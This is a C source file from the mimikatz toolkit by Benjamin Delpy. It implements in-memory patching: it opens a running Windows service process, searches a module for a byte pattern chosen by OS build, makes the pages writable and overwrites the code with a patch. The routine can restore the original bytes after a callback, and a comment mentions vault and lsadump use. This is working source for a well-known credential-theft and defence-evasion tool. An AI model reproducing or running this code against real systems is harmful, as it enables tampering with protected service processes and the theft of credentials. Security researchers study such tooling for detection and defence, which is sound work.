/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kull_m_patch.h"

BOOL kull_m_patch(PKULL_M_MEMORY_SEARCH sMemory, PKULL_M_MEMORY_ADDRESS pPattern, SIZE_T szPattern, PKULL_M_MEMORY_ADDRESS pPatch, SIZE_T szPatch, LONG offsetOfPatch, PKULL_M_PATCH_CALLBACK pCallBackBeforeRestore, int argc, wchar_t * args[], NTSTATUS * pRetCallBack)
{
	BOOL result = FALSE, resultBackup = !pCallBackBeforeRestore, resultProtect = TRUE;
	KULL_M_MEMORY_ADDRESS destination = {NULL, sMemory->kull_m_memoryRange.kull_m_memoryAdress.hMemory};
	KULL_M_MEMORY_ADDRESS backup = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	MEMORY_BASIC_INFORMATION readInfos;
	NTSTATUS status;
	DWORD flags, oldProtect = 0, tempProtect = 0;
	
	if(kull_m_memory_search(pPattern, szPattern, sMemory, TRUE))
	{
		destination.address = (LPBYTE) sMemory->result + offsetOfPatch;

		if(!resultBackup)
			if(backup.address = LocalAlloc(LPTR, szPatch))
				resultBackup = kull_m_memory_copy(&backup, &destination, szPatch);

		if(resultBackup)
		{
			if(kull_m_memory_query(&destination, &readInfos))
			{
				flags = readInfos.Protect & ~0xff;
				if((readInfos.Protect & 0x0f) && ((readInfos.Protect & 0x0f) < PAGE_READWRITE))
					tempProtect = PAGE_READWRITE;
				else if((readInfos.Protect & 0xf0) && ((readInfos.Protect & 0xf0) < PAGE_EXECUTE_READWRITE))
					tempProtect = PAGE_EXECUTE_READWRITE;
				
				if(tempProtect)
					resultProtect = kull_m_memory_protect(&destination, szPatch, tempProtect | flags, &oldProtect);

				if(resultProtect)
				{
					if(result = kull_m_memory_copy(&destination, pPatch, szPatch))
					{
						if(pCallBackBeforeRestore)
						{
							status = pCallBackBeforeRestore(argc, args);
							if(pRetCallBack)
								*pRetCallBack = status;
							result = kull_m_memory_copy(&destination, &backup, szPatch);
						}
					}
					if(oldProtect)
						kull_m_memory_protect(&destination, szPatch, oldProtect, NULL);
				}
			}
			if(backup.address)
				LocalFree(backup.address);
		}
	}
	return result;
}

PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber)
{
	SIZE_T i;
	PKULL_M_PATCH_GENERIC current = NULL;

	for(i = 0; i < cbGenerics; i++)
	{
		if(generics[i].MinBuildNumber <= BuildNumber)
			current = &generics[i];
		else break;
	}
	return current;
}

BOOL kull_m_patch_genericProcessOrServiceFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PCWSTR processOrService, PCWSTR moduleName, BOOL isService) // to do for process // to do callback ! (vault & lsadump)
{
	BOOL result = FALSE;
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	PKULL_M_MEMORY_HANDLE hMemory;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
	HANDLE hProcess;
	KULL_M_MEMORY_ADDRESS
		aPatternMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;

	PKULL_M_PATCH_GENERIC currenReferences;

	if(currenReferences = kull_m_patch_getGenericFromBuild(generics, cbGenerics, MIMIKATZ_NT_BUILD_NUMBER))
	{
		aPatternMemory.address = currenReferences->Search.Pattern;
		aPatchMemory.address = currenReferences->Patch.Pattern;
		if(kull_m_service_getUniqueForName(processOrService, &ServiceStatusProcess))
		{
			if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
			{
				if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
				{
					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
					{
						if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, moduleName, &iModule))
						{
							sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
							sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;

							if(result = kull_m_patch(&sMemory, &aPatternMemory, currenReferences->Search.Length, &aPatchMemory, currenReferences->Patch.Length, currenReferences->Offsets.off0, NULL, 0, NULL, NULL))
								kprintf(L"\"%s\" service patched\n", processOrService);
							else
								PRINT_ERROR_AUTO(L"kull_m_patch");
						} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
						kull_m_memory_close(hMemory);
					}
				} else PRINT_ERROR_AUTO(L"OpenProcess");
			} else PRINT_ERROR(L"Service is not running\n");
		} else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
	} else PRINT_ERROR(L"Incorrect version in references\n");

	return result;
}